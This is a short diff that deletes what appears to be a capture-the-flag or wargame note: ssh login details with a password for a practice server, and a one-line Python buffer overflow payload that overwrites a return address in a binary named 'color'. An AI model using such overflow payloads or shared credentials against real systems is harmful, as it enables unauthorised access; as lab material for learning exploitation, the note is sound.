@@ -1,5 +1,0 @@
-ssh color@104.131.79.111 -p 1001
-pw: guest
-
-payload:
-(python -c "print('A'*52 + '\x57\x86\x04\x08')";cat) | ./color
